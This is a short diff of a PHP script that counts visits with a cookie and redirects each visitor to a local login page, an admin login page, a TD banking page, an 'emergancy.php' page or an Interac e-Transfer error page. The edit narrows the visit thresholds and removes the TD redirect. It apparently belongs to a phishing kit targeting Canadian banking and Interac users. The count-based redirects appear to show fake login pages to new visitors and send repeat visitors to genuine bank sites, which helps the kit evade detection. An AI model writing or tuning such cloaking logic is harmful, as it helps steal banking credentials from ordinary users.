@@ -25,14 +25,12 @@ if (!isset($_COOKIE['visit_count'])) {
 }
 
 // Redirect based on visit count
-if ($visit_count >= 4 && $visit_count < 8) {
+if ($visit_count >= 3 && $visit_count < 4) {
   header("Location: login.php");
-} elseif ($visit_count >= 8 && $visit_count < 9) {
+} elseif ($visit_count >= 4 && $visit_count < 5) {
   header("Location: /admin/login.php");
-} elseif ($visit_count >= 9 && $visit_count < 10) {
-  header("Location: https://www.td.com/ca/en/personal-banking");
-} elseif ($visit_count >= 10 && $visit_count < 111) {
-  header("Location: emergancy.php");
+
+
 } else {
     header('Location: https://etransfer.interac.ca/error/');
 }
